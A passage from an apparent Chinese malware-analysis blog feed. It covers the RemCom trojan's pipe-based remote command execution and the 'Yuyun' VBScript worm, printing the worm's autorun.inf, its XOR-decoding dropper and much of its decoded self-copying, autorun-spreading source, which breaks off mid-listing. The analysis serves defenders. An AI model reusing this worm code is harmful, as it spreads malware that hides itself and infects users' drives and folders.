gbk</em></p><p>从上图可以看到脚本上传了 xQlLMMCc.exe文件，这个文件就是<a href="https://github.com/kavika13/RemCom">RemCom</a>开源木马，主要负责创建管道，执行shell命令。在命令执行完成后（exit），该文件以及相应服务就会被删除</p><h2 id="Remcom木马分析"><a href="#Remcom木马分析" class="headerlink" title="Remcom木马分析"></a>Remcom木马分析</h2><p>从流量中捕获的文件被设备标记为黑客工具，分析时使用IDA进行分析，并未分析源码</p><table><thead><tr><th>文件名</th><th>ViSbRFqi.exe</th></tr></thead><tbody><tr><td>大小</td><td>56320 字节</td></tr><tr><td>MD5</td><td>6983F7001DE10F4D19FC2D794C3EB534</td></tr><tr><td>SHA1</td><td>23873BF2670CF64C2440058130548D4E4DA412DD</td></tr><tr><td>CRC32</td><td>1263E86C</td></tr></tbody></table><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20220616161244191.png" alt="image-20220616161244191"></p><p>样本未加壳，编写语言为C++，编译时间2012年8月9日</p><p>使用IDA pro进行静态反编译</p><p>样本运行后先提升自身为管理员权限，然后创建服务“RemComSvc”，服务主线程实现木马主体功能，服务停止后删除创建的服务，清除入侵痕迹</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E4%B8%BB%E4%BD%93%E4%BB%A3%E7%A0%81.png" alt="样本主体代码"></p><p>木马的主体功能在服务主线程中执行，先将服务设置为执行状态，然后开启服务功能线程</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E6%9C%8D%E5%8A%A1%E4%B8%BB%E7%BA%BF%E7%A8%8B%E4%BB%A3%E7%A0%81.png" alt="服务主线程代码"></p><p>通信线程池用于处理传入的RemCom.exe请求，即执行主控端shell命令行，“RemComSvc”服务停止后，删除这个服务</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E4%B8%BB%E7%BA%BF%E7%A8%8B%E6%9C%8D%E5%8A%A1%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81.png" alt="主线程服务执行代码"></p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E6%B8%85%E9%99%A4%E6%9C%8D%E5%8A%A1%E4%BB%A3%E7%A0%81.png" alt="清除服务代码"></p><p>创建一个命名的双通管道，名字是<a href="file://./pipe/RemCom_communicaton">\.\pipe\RemCom_communicaton</a>，等待客户端连接</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E9%80%9A%E4%BF%A1%E7%BA%BF%E7%A8%8B%E6%B1%A0%E4%BB%A3%E7%A0%81.png" alt="通信线程池代码"></p><p>读取管道中的客户端请求，创建进程执行客户端命令，并将执行结果写入管道</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86%E4%BB%A3%E7%A0%81.png" alt="客户端请求处理代码"></p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81.png" alt="客户端命令执行代码"></p><h2 id="样本关联拓线"><a href="#样本关联拓线" class="headerlink" title="样本关联拓线"></a>样本关联拓线</h2><p>经过流量分析，发现RemCom文件是由另一个svchost.exe挖矿病毒产生的</p><p>有关代码如下</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20220616164138234.png" alt="image-20220616164138234"></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RemCom</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Yuyun脚本蠕虫分析</title>
    <link href="/2022/06/14/Yuyun%E8%84%9A%E6%9C%AC%E8%A0%95%E8%99%AB%E5%88%86%E6%9E%90/"/>
    <url>/2022/06/14/Yuyun%E8%84%9A%E6%9C%AC%E8%A0%95%E8%99%AB%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>捕获到一个纯vbs脚本病毒</p><img src="image-20220614134519359.png" alt="样本截图" style="zoom:50%;" /><p>包含一个autorun.inf文件和一个Thumb.db文件，两个文件均为隐藏的受保护的操作系统文件（只读）。</p><p><strong>autorun.inf MD5:080d8ef2430b49f991b460abf4af5156</strong></p><p><strong>Thumb.db MD5:0a456ffff1d3fd522457c187ebcf41e4</strong></p><h2 id="autorun-inf"><a href="#autorun-inf" class="headerlink" title="autorun.inf"></a>autorun.inf</h2><p><a href="https://baike.baidu.com/item/autorun.inf">autorun.inf</a>常见于可移动介质传播蠕虫病毒，其作用是允许在双击磁盘时自动运行指定的某个文件。</p><p>注：在2011年2月8日发布的安全公告KB967940中，微软对Windows自动运行功能进行了最新升级，限定Windows XP、Windows Server 2003、Vista（Vista是到Win7的一个过渡系统）和Windows Server 2008平台上的自动运行功能仅支持CD和DVD媒体。当用户使用包含autorun.inf文件的USB设备、网络共享或其它非CD&#x2F;DVD媒体时，系统不会执行自动运行。</p><p>autorun.inf 内容如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[autorun]</span><br><span class="hljs-attr">open</span>=WScript.exe //e:VBScript thumb.db auto<br>shell\<span class="hljs-attr">open</span>=Open<br>shell\open\<span class="hljs-attr">Command</span>=WScript.exe //e:VBScript thumb.db auto<br>shell\open\<span class="hljs-attr">Default</span>=<span class="hljs-number">1</span><br>shell\<span class="hljs-attr">explore</span>=Explore<br>shell\explore\<span class="hljs-attr">Command</span>=WScript.exe //e:VBScript thumb.db auto<br></code></pre></td></tr></table></figure><p>即自动调用WScript.exe以VBS脚本来执行thumb.db文件，执行参数为auto</p><p>由此可见，该样本应该属于蠕虫病毒，并且较老，传播能力一般</p><h2 id="Thumb-db"><a href="#Thumb-db" class="headerlink" title="Thumb.db"></a>Thumb.db</h2><p>thumb.db为vbs脚本病毒，主要代码如下：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-comment">&#x27;www.muslimah.or.id;==================================== my name:Yuyun 1.0</span><br><br><span class="hljs-comment">&#x27; ============================</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">Dim</span> fso, ws<br><span class="hljs-keyword">Set</span> fso = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;scripting.filesystemobject&quot;</span>)<br><span class="hljs-keyword">Set</span> ws = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;wscript.Shell&quot;</span>)<br><span class="hljs-keyword">Set</span> sh = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.application&quot;</span>)<br>Q=WScript.ScriptFullName           <span class="hljs-comment">&#x27;运行的脚本文件的完全路径</span><br>tmp=fso.GetSpecialFolder(<span class="hljs-number">2</span>)<br>tn=fso.GetTempName                 <span class="hljs-comment">&#x27;返回随机生成的临时文件或文件夹的名称</span><br>tmpt=tmp+<span class="hljs-string">&quot;\&quot;</span>+tn                    <span class="hljs-comment">&#x27;临时文件绝对路径</span><br><span class="hljs-keyword">Set</span> swt=WScript.Arguments          <span class="hljs-comment">&#x27;参数集合</span><br><span class="hljs-keyword">If</span> swt.Count&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span><br>status=swt(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">If</span> status=<span class="hljs-string">&quot;auto&quot;</span> <span class="hljs-keyword">Then</span><br>sh.Explore <span class="hljs-built_in">Left</span>(WScript.ScriptFullName,<span class="hljs-number">3</span>)       <span class="hljs-comment">&#x27;参数是auto返回脚本文件所在盘符，如C:/</span><br><span class="hljs-keyword">Else</span> <br>status=<span class="hljs-built_in">Left</span>(WScript.ScriptFullName,<span class="hljs-built_in">Len</span>(WScript.ScriptFullName)-<span class="hljs-built_in">Len</span>(WScript.ScriptName))+status     <span class="hljs-comment">&#x27;否则以参数为文件夹名</span><br><span class="hljs-keyword">If</span> fso.FolderExists(status) <span class="hljs-keyword">Then</span>    <span class="hljs-comment">&#x27;存在打开文件夹</span><br>sh.Explore status             <br><span class="hljs-keyword">Else</span><br>fso.CreateFolder status          <span class="hljs-comment">&#x27;不存在，创建打开文件夹</span><br>sh.Explore status<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Else</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Set</span> QQ=fso.GetFile(Q)<br><span class="hljs-keyword">Set</span> Q1=QQ.OpenAsTextStream(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)    <span class="hljs-comment">&#x27;打开脚本文件，返回一个TextStream对象</span><br>isiQ=Q1.Read(QQ.Size)<br>Q1.close<br>t1=<span class="hljs-built_in">InStr</span>(<span class="hljs-number">1</span>,isiQ,<span class="hljs-string">&quot;Yuyun^_^~!~2008&quot;</span>+<span class="hljs-string">&quot; &gt;&gt;&gt;&quot;</span>,<span class="hljs-number">0</span>)+<span class="hljs-number">18</span>   <span class="hljs-comment">&#x27;在运行的脚本文件中查询指定字符串</span><br>isiQ=<span class="hljs-built_in">Right</span>(isiQ,<span class="hljs-built_in">Len</span>(isiQ)-t1)                    <span class="hljs-comment">&#x27;返回Yuyun^_^~!~2008 &gt;&gt;&gt;后的字符串</span><br>hsl=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">For</span> v=<span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-built_in">Len</span>(isiQ)                             <span class="hljs-comment">&#x27;解码得到的字符串</span><br>t=<span class="hljs-built_in">Asc</span>(<span class="hljs-built_in">Mid</span>(isiQ,v,<span class="hljs-number">1</span>))<br>hsl=hsl+<span class="hljs-built_in">Chr</span>(t <span class="hljs-keyword">Xor</span> <span class="hljs-number">7</span>)<br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">If</span> fso.FileExists(tmpt) <span class="hljs-keyword">Then</span> fso.GetFile(tmpt).Attributes=<span class="hljs-number">0</span><br><span class="hljs-keyword">Set</span> temporary=fso.OpenTextFile(tmpt,<span class="hljs-number">2</span>,<span class="hljs-literal">True</span>,<span class="hljs-number">0</span>)     <span class="hljs-comment">&#x27;打开生成的临时文件</span><br>temporary.Write hsl                               <span class="hljs-comment">&#x27;写入解码得到的字符串</span><br>temporary.Close<br>ws.Run <span class="hljs-string">&quot;WScript.exe //e:VBScript &quot;</span>+tmpt+<span class="hljs-string">&quot; &quot;&quot;&quot;</span>+Q+<span class="hljs-string">&quot;&quot;&quot;&quot;</span>         <span class="hljs-comment">&#x27;以VBScrip执行生成的tmp文件</span><br><br> <span class="hljs-comment">&#x27; Yuyun^_^~!~2008 &gt;&gt;&gt; :::::::::::::::::::::::::::::::::::::::::::::::::::::::</span><br><br> <span class="hljs-comment">&#x27;J~&#x27;ifjb&#x27;=&#x27;^r~ri&#x27;Qbu&#x27;6)7</span><br><br> <span class="hljs-comment">&#x27;N&#x27;mrts&#x27;pfiif&#x27;tbb&#x27;bqbu~&#x27;`nuk&#x27;khhlt&#x27;indb+&#x27;ebssbu+&#x27;lnict&#x27;btwbdnfkk~&#x27;f&#x27;jhtkbj&#x27;`nuk</span><br><br> <span class="hljs-comment">&#x27;e~=&#x27;Fihi~jhrtb&#x27;ni&#x27;Mfsnj+&#x27;Ihqbjebu&#x27;577?</span><br><br> <span class="hljs-comment">&#x27;Pobi&#x27;N&#x27;ahric&#x27;ihsoni`&#x27;ebfrs~&#x27;bktb)))&#x27;fic&#x27;sobi&#x27;N&#x27;puhsb&#x27;sont&#x27;tdunws&#x27;ahu&#x27;fkk</span><br><br> :::::::::::::::::::::::::::::::::::::::::::::::::::::::<br> (以下省略)<br></code></pre></td></tr></table></figure><p>可以看出代码的主要功能是，解码、释放并执行包含的经过混淆的vbs脚本文件</p><p>生成的vbs文件，如下：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-comment">&#x27;=======================================================</span><br><span class="hljs-comment">&#x27; My name : Yuyun Ver 1.0</span><br><span class="hljs-comment">&#x27; I just wanna see every girl looks nice, better, kinds especially a moslem girl</span><br><span class="hljs-comment">&#x27; by: Anonymouse in Jatim, November 2008</span><br><span class="hljs-comment">&#x27; When I found nothing beauty else... and then I wrote this script for all</span><br><span class="hljs-comment">&#x27;=======================================================</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">Dim</span> fso, ws, status,status1, fly<br><span class="hljs-keyword">Set</span> fso = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;scripting.filesystemobject&quot;</span>)<br><span class="hljs-keyword">Set</span> ws = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;wscript.Shell&quot;</span>)<br><span class="hljs-keyword">Set</span> sh = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.application&quot;</span>)<br><span class="hljs-keyword">Set</span> net = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;wscript.network&quot;</span>)<br>fly=<span class="hljs-literal">false</span><br>tmp=fso.GetSpecialFolder(<span class="hljs-number">2</span>)<br>tn=fso.GetTempName<br>tmpt=tmp+<span class="hljs-string">&quot;\&quot;</span>+tn<br>docx=ws.SpecialFolders(<span class="hljs-string">&quot;MyDocuments&quot;</span>)         <span class="hljs-comment">&#x27;我的文档文件夹</span><br><br><span class="hljs-keyword">Set</span> swt=WScript.Arguments<br><span class="hljs-keyword">If</span> swt.Count&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span>          <span class="hljs-comment">&#x27;存在参数，将参数赋值给status</span><br>status=swt(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">if</span> fso.fileexists(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>) <span class="hljs-keyword">then</span><br><span class="hljs-keyword">set</span> ira=fso.getfile(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>)<br>ira.attributes=<span class="hljs-number">0</span><br>ira.name=<span class="hljs-string">&quot;shalihah.ira&quot;</span><br><span class="hljs-keyword">if</span> ira.name=<span class="hljs-string">&quot;shalihah.ira&quot;</span> <span class="hljs-keyword">then</span><br>ira.name=<span class="hljs-string">&quot;Yuyun.Q&quot;</span><br><span class="hljs-keyword">set</span> ira=fso.opentextfile(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br><span class="hljs-keyword">else</span><br>fly=<span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">set</span> ira=fso.opentextfile(tmp+<span class="hljs-string">&quot;\Yuyun.Q&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">Set</span> AQ=fso.GetFile(status)      <span class="hljs-comment">&#x27;获取参数脚本文件</span><br><span class="hljs-keyword">If</span> fso.FileExists(tmpt) <span class="hljs-keyword">Then</span> fso.GetFile(tmpt).Attributes=<span class="hljs-number">0</span><br>AQ.Copy tmpt,<span class="hljs-literal">True</span>               <span class="hljs-comment">&#x27;复制参数脚本文件到临时文件</span><br><span class="hljs-keyword">Set</span> AQ=fso.GetFile(tmpt)<br>AQ.Attributes=<span class="hljs-number">39</span>               <span class="hljs-comment">&#x27;39=32+4+2+1,即存档文件+系统文件+隐藏文件+只读文件</span><br>anv=tmp+<span class="hljs-string">&quot;\auto.exe&quot;</span><br><span class="hljs-keyword">If</span> <span class="hljs-keyword">Not</span> fso.FileExists(anv) <span class="hljs-keyword">Then</span> AQ.Copy anv          <span class="hljs-comment">&#x27;复制重命名为auto.exe</span><br><span class="hljs-keyword">Set</span> auto=fso.GetFile(anv) <br>auto.attributes=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">Set</span> aut=fso.OpenTextFile(anv,<span class="hljs-number">2</span>,<span class="hljs-literal">True</span>,<span class="hljs-number">0</span>)                <span class="hljs-comment">&#x27;以Text打开auto.exe</span><br>isi=<span class="hljs-string">&quot;[autorun]&gt;open=WScript.exe //e:VBScript thumb.db auto&gt;shell\open=Open&gt;shell\open\Command=WScript.exe //e:VBScript thumb.db auto&gt;shell\open\Default=1&gt;shell\explore=Explore&gt;shell\explore\Command=WScript.exe //e:VBScript thumb.db auto&quot;</span><br>isi=<span class="hljs-built_in">Replace</span>(isi,<span class="hljs-string">&quot;&gt;&quot;</span>,vbCrLf)                           <span class="hljs-comment">&#x27;&gt;替换为回车</span><br>aut.Write isi                                         <span class="hljs-comment">&#x27;写入auto.exe</span><br>aut.Close<br>auto.Attributes=<span class="hljs-number">39</span><br><br>ltkc=sh.Name<span class="hljs-built_in">space</span>(&amp;H1c&amp;).Self.path + <span class="hljs-string">&quot;\Microsoft\CD Burning&quot;</span><br>AQ.Copy ltkc+<span class="hljs-string">&quot;\thumb.db&quot;</span>,<span class="hljs-literal">True</span><br>auto.Copy ltkc+<span class="hljs-string">&quot;\autorun.inf&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">If</span> fso.FileExists(docx+<span class="hljs-string">&quot;\database.mdb&quot;</span>) <span class="hljs-keyword">Then</span> fso.GetFile(docx+<span class="hljs-string">&quot;\database.mdb&quot;</span>).Attributes=<span class="hljs-number">0</span><br>AQ.Copy docx+<span class="hljs-string">&quot;\database.mdb&quot;</span>,<span class="hljs-literal">True</span>                    <span class="hljs-comment">&#x27;原脚本文件复制到我的文档目录下，命名为database.mdb</span><br>regQ                                                  <span class="hljs-comment">&#x27;修改注册表</span><br><span class="hljs-keyword">Set</span> rara=UNISKA<br>Hertz <span class="hljs-literal">False</span><br><span class="hljs-keyword">If</span> <span class="hljs-built_in">Day</span>(Now)&lt;&gt;<span class="hljs-number">3</span> <span class="hljs-keyword">Then</span> rekursif docx,<span class="hljs-number">1</span> <span class="hljs-keyword">Else</span> rekursif docx,<span class="hljs-number">3</span>    <span class="hljs-comment">&#x27;判断时间是不是3日</span><br><br><span class="hljs-keyword">call</span> attack_net<br>Hertz <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">Sub</span> rekursif(path,dp)<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br>dropf path<br>wscript.sleep <span class="hljs-number">50</span><br><span class="hljs-keyword">If</span> dp&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> fldr1 <span class="hljs-keyword">In</span> fso.GetFolder(path+<span class="hljs-string">&quot;\&quot;</span>).SubFolders<br>rekursif fldr1.Path, dp<span class="hljs-number">-1</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">Sub</span> dropf(path)<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">day</span>(now)=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-built_in">month</span>(now)mod <span class="hljs-number">3</span>)=<span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <br>rara.copy path+<span class="hljs-string">&quot;\Baca AQ.rtf&quot;</span><br>rara.copy path+<span class="hljs-string">&quot;\My name is Yuyun.rtf&quot;</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><br>g1=path+<span class="hljs-string">&quot;\autorun.inf&quot;</span><br>g2=path+<span class="hljs-string">&quot;\Thumb.db&quot;</span><br><span class="hljs-keyword">If</span> fso.FileExists(g1) <span class="hljs-keyword">Then</span> <br><span class="hljs-keyword">Set</span> g11=fso.GetFile(g1) <br><span class="hljs-keyword">If</span> g11.Attributes&lt;&gt;<span class="hljs-number">39</span> <span class="hljs-keyword">Then</span> <br>g11.Attributes=<span class="hljs-number">0</span><br>auto.Copy path+<span class="hljs-string">&quot;\autorun.inf&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">else</span> <br>auto.Copy path+<span class="hljs-string">&quot;\autorun.inf&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><br><br><span class="hljs-keyword">If</span> fso.FileExists(g2) <span class="hljs-keyword">Then</span> <br><span class="hljs-keyword">Set</span> g12=fso.GetFile(g2)<br><span class="hljs-keyword">If</span> g12.Attributes&lt;&gt;<span class="hljs-number">39</span> <span class="hljs-keyword">Then</span><br>g12.Attributes=<span class="hljs-number">0</span><br>AQ.Copy path+<span class="hljs-string">&quot;\Thumb.db&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">else</span><br>AQ.Copy path+<span class="hljs-string">&quot;\Thumb.db&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><br><span class="hljs-keyword">If</span> <span class="hljs-keyword">Not</span> fso.FileExists(path+<span class="hljs-string">&quot;\Microsoft.lnk&quot;</span>) <span class="hljs-keyword">Then</span>              <span class="hljs-comment">&#x27;我的文档文件夹是否存在Microsoft.lnk</span><br>shorZvnita path+<span class="hljs-string">&quot;\Microsoft&quot;</span>,<span class="hljs-string">&quot;Microsoft&quot;</span><br>drop=<span class="hljs-built_in">Array</span>(<span class="hljs-string">&quot;New Harry Potter and...&quot;</span>,<span class="hljs-string">&quot;New Folder&quot;</span>,<span class="hljs-string">&quot;SuratQ&quot;</span>,<span class="hljs-string">&quot;Rahasia&quot;</span>,<span class="hljs-string">&quot;Game&quot;</span>,<span class="hljs-string">&quot;Zvnita&quot;</span>,<span class="hljs-string">&quot;Download&quot;</span>,<span class="hljs-string">&quot;DataQ&quot;</span>,<span class="hljs-string">&quot;DataQ&quot;</span>)    <span class="hljs-comment">&#x27;创建超链接文件</span><br>ww=<span class="hljs-number">1</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> d 